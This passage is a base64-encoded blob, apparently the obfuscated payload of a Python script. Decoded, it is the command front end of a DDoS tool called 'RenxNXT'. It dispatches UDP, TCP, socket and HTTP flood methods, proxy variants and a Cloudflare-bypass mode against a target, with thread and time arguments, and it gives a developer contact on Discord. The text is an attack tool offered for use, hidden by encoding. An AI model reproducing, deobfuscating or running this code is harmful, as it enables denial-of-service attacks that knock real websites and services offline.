VnSAgICAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAiK0ZvcmUuTElHSFRXSElURV9FWCAgKyLilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilZcgIOKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZHilojilojilZTilojilojilZcg4paI4paI4pWRIOKVmuKWiOKWiOKWiOKVlOKVnSAgICAgICAgICAgICAgICAgXG4iKQogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUV0hJVEVfRVggICsi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZHilZrilojilojilZfilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEg4paI4paI4pWU4paI4paI4pWXICAgICAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAiK0ZvcmUuTElHSFRXSElURV9FWCAgKyLilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilojilojilojilojilZHilojilojilZEg4pWa4paI4paI4paI4paI4pWR4paI4paI4pWU4pWdIOKWiOKWiOKVlyAgICAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAiK0ZvcmUuTElHSFRXSElURV9FWCAgKyLilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgICAgICAgICAgXG4iKQogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVggICAgICAgICAgICsiICAgICAgICDilZDilZDilabilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilabilZDilZBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsi4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWp4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWp4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXXG4iKQogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkSAiK0ZvcmUuTElHSFRXSElURV9FWCAgICsiICAgICAgICBXZWxjb21lIFRvIFRoZSBNYWluIFNjcmVlbiBPZiBSZW54TlhUICAiK0ZvcmUuTElHSFRHUkVFTl9FWCAgKyIgICAgIOKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYKyLilZEgIitGb3JlLkxJR0hUV0hJVEVfRVggICArIiAgICAgICAgICBUeXBlIFtoZWxwXSB0byBzZWUgdGhlIENvbW1hbmRzICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICsiICAgICAgIOKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYKyLilZEgIitGb3JlLkxJR0hUV0hJVEVfRVggICArIiAgICAgICAgIENvbnRhY3QgRGV2IC0gRGlzY29yZCBSZW5ueFYyIzExMTEgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCArIiAgICAgIOKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYKyLilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ1cbiIpCiAgICBzdGRvdXQud3JpdGUoIlxuIikKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyQkIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpkZWYgY29tbWFuZCgpOgogICAgc3Rkb3V0LndyaXRlKEZvcmUuTElHSFRDWUFOX0VYKyLilZTilZDilZDilZAiK0ZvcmUuTElHSFRDWUFOX0VYKyJbIiJyb290IitGb3JlLkxJR0hUR1JFRU5fRVgrIkAiK0ZvcmUuTElHSFRDWUFOX0VYKyJSZW5ueCIrRm9yZS5DWUFOKyJdIitGb3JlLkxJR0hUQ1lBTl9FWCsiXG7ilZrilZDilZBceDFiWzM4OzI7MDsyNTU7MTg5bT4gIitGb3JlLldISVRFKQogICAgY29tbWFuZCA9IGlucHV0KCkKICAgIGlmIGNvbW1hbmQgPT0gImNscyIgb3IgY29tbWFuZCA9PSAiY2xlYXIiOgogICAgICAgIGNsZWFyKCkKICAgICAgICB0aXRsZSgpCiAgICBlbGlmIGNvbW1hbmQgPT0gImhlbHAiIG9yIGNvbW1hbmQgPT0gIj8iOgogICAgICAgIGhlbHAoKQogICAgZWxpZiBjb21tYW5kID09ICJjcmVkaXQiOgogICAgICAgIGNyZWRpdCgpCiAgICBlbGlmIGNvbW1hbmQgPT0gImV4aXQiOgogICAgICAgIGV4aXQoKQoKICAgICAgICAjdGltZXIuam9pbigpCiAgICAgICAgdGltZS5zbGVlcCgxMDAwKQogICAgZWxpZiBjb21tYW5kID09ICJzb2MiIG9yIGNvbW1hbmQgPT0gIlNPQyI6CiAgICAgICAgdGFyZ2V0LCB0aHJlYWQsIHQgPSBnZXRfaW5mb19sNygpCiAgICAgICAgdGltZXIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jb3VudGRvd24sIGFyZ3M9KHQsKSkKICAgICAgICB0aW1lci5zdGFydCgpCiAgICAgICAgTGF1bmNoU09DKHRhcmdldCwgdGhyZWFkLCB0KQogICAgICAgIHRpbWVyLmpvaW4oKQogICAgZWxpZiBjb21tYW5kID09ICJ1ZHAiIG9yIGNvbW1hbmQgPT0gIlVEUCI6CiAgICAgICAgdGFyZ2V0LCBwb3J0LCB0aHJlYWQsIHQgPSBnZXRfaW5mb19sNCgpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cnVuc2VuZGVyLCBhcmdzPSh0YXJnZXQsIHBvcnQsIHQsIHRocmVhZCkpLnN0YXJ0KCkKICAgICAgICB0aW1lciA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWNvdW50ZG93biwgYXJncz0odCwpKQogICAgICAgIHRpbWVyLnN0YXJ0KCkKICAgICAgICB0aW1lci5qb2luKCkKICAgIGVsaWYgY29tbWFuZCA9PSAidGNwIiBvciBjb21tYW5kID09ICJUQ1AiOgogICAgICAgIHRhcmdldCwgcG9ydCwgdGhyZWFkLCB0ID0gZ2V0X2luZm9fbDQoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXJ1bmZsb29kZXIsIGFyZ3M9KHRhcmdldCwgcG9ydCwgdCwgdGhyZWFkKSkuc3RhcnQoKQogICAgICAgIHRpbWVyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Y291bnRkb3duLCBhcmdzPSh0LCkpCiAgICAgICAgdGltZXIuc3RhcnQoKQogICAgICAgIHRpbWVyLmpvaW4oKQogICAgZWxpZiBjb21tYW5kID09ICJjZmIiIG9yIGNvbW1hbmQgPT0gIkNGQiI6CiAgICAgICAgdGFyZ2V0LCB0aHJlYWQsIHQgPSBnZXRfaW5mb19sNygpCiAgICAgICAgdGltZXIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jb3VudGRvd24sIGFyZ3M9KHQsKSkKICAgICAgICB0aW1lci5zdGFydCgpCiAgICAgICAgTGF1bmNoQ0ZCKHRhcmdldCwgdGhyZWFkLCB0KQogICAgICAgIHRpbWVyLmpvaW4oKQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICAgCgpkZWYgZnVuYygpOgogICAgCiAgICBzdGRvdXQud3JpdGUoRm9yZS5SRUQrIiBcbltceDFiWzM4OzI7MDsyNTU7MTg5bU9USEVSIitGb3JlLlJFRCsiXVxuIikKICAgIHN0ZG91dC53cml0ZShGb3JlLk1BR0VOVEErIiDigKIgIitGb3JlLldISVRFKyJjbGVhci9jbHMgICIrRm9yZS5SRUQrIjogIitGb3JlLldISVRFKyJDbGVhciBjb25zb2xlXG4iKQogICAgc3Rkb3V0LndyaXRlKEZvcmUuTUFHRU5UQSsiIOKAoiAiK0ZvcmUuV0hJVEUrImV4aXQgICAgICAgIitGb3JlLlJFRCsiOiAiK0ZvcmUuV0hJVEUrIkJ5ZS4uXG4iKQogICAgc3Rkb3V0LndyaXRlKEZvcmUuTUFHRU5UQSsiIOKAoiAiK0ZvcmUuV0hJVEUrImNyZWRpdCAgICAgIitGb3JlLlJFRCsiOiAiK0ZvcmUuV0hJVEUrIlRoYW5rcyBmb3JcbiIpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgaW5pdChjb252ZXJ0PVRydWUpCiAgICBpZiBsZW4oc3lzLmFyZ3YpIDwgMjoKICAgICAgICB1YSA9IG9wZW4oJy4vcmVzb3VyY2VzL3VhLnR4dCcsICdyJykucmVhZCgpLnNwbGl0KCdcbicpCiAgICAgICAgY2xlYXIoKQogICAgICAgIHRpdGxlKCkKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBjb21tYW5kKCkKICAgIGVsaWYgbGVuKHN5cy5hcmd2KSA9PSA1OgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgc3Rkb3V0LndyaXRlKCJNZXRob2Q6IGNmYiwgcHhjZmIsIGNmcmVxLCBjZnNvYywgcHhza3ksIHNreSwgaHR0cDIsIHB4aHR0cDIsIGdldCwgcG9zdCwgaGVhZCwgc29jLCBweHJhdywgcHhzb2NcbiIpCiAgICAgICAgc3Rkb3V0LndyaXRlKGYidXNhZ2U6fiMgcHl0aG9uMyB7c3lzLmFyZ3ZbMF19IDxtZXRob2Q+IDx0YXJnZXQ+IDx0aHJlYWQ+IDx0aW1lPlxuIikKICAgICAgICBzeXMuZXhpdCgpCiAgICB1YSA9IG9wZW4oJy4vcmVzb3VyY2VzL3VhLnR4dCcsICdyJykucmVhZCgpLnNwbGl0KCdcbicpCiAgICBtZXRob2QgPSBzeXMuYXJndlsxXS5yc3RyaXAoKQogICAgdGFyZ2V0ID0gc3lzLmFyZ3ZbMl0ucnN0cmlwKCkKICAgIHRocmVhZCA9IHN5cy5hcmd2WzNdLnJzdHJpcCgpCiAgICB0ICAgICAgPSBzeXMuYXJndls0XS5yc3RyaXAoKQogICAgaWYgbWV0aG9kID09ICJjZmIiOgogICAgICAgIHRpbWVyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Y291bnRkb3duLCBhcmdzPSh0LCkpCiAgICAgICAgdGltZXIuc3RhcnQoKQogICAgICAgIExhdW5jaENGQih0YXJnZXQsIHRocmVhZCwgdCkKICAgICAgICB0aW1lci5qb2luKCkKICAgIGVsaWYgbWV0aG9kID09ICJweGNmYiI6CiAgICAgICAgaWYgZ2V0X3Byb3hpZXMoKToKICAgICAgICAgICAgdGltZXIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jb3VudGRvd24sIGFyZ3M9KHQsKSkKICAgICAgICAgICAgdGltZXIuc3RhcnQoKQogICAgICAgICAgICBMYXVuY2hQWENGQih0YXJnZXQsIHRocmVhZCwgdCkKICAgICAgICAgICAgdGltZXIuam9pbigpCiAgICBlbGlmIG1ldGhvZCA9PSAic29jIjoKICAgICAgICB0aW1lciA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWNvdW50ZG93biwgYXJncz0odCwpKQogICAgICAgIHRpbWVyLnN0YXJ0KCkKICAgICAgICBMYXVuY2hTT0ModGFyZ2V0LCB0aHJlYWQsIHQpCiAgICAgICAgdGltZXIuam9pbigpCiAgICBlbGlmIG1ldGhvZCA9PSAiY2Zzb2MiOgogICAgICAgIHN0ZG91dC53cml0ZShGb3JlLk1BR0VOVEEgKyAiIFsqXSAiICsgRm9yZS5XSElURSArICJCeXBhc3NpbmcgQ0YuLi4gKE1heCA2MHMpXG4iKQogICAgICAgIGlmIGdldF9jb29raWUodGFyZ2V0KToKICAgICAgICAgICAgdGltZXIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jb3VudGRvd24sIGFyZ3M9KHQsKSkKICAgICAgICAgICAgdGltZXIuc3RhcnQoKQogICAgICAgICAgICBMYXVuY2hDRlNPQyh0YXJnZXQsIHRocmVhZCwgdCkKICAgICAgICAgICAgdGltZXIuam9pbigpCiAgICBlbHNlOgogICAgICAgIHN0ZG91dC53cml0ZSgiTm8gbWV0aG9kIGZvdW5kLlxuTWV0aG9kOiBjZmIsIHB4Y2ZiLCBjZnJlcSwgY2Zzb2MsIHB4c2t5LCBza3ksIGh0dHAyLCBweGh0dHAyLCBnZXQsIHBvc3QsIGhlYWQsIHNvYywgcHhyYXcsIHB4c29jXG4iKQoKCgo="))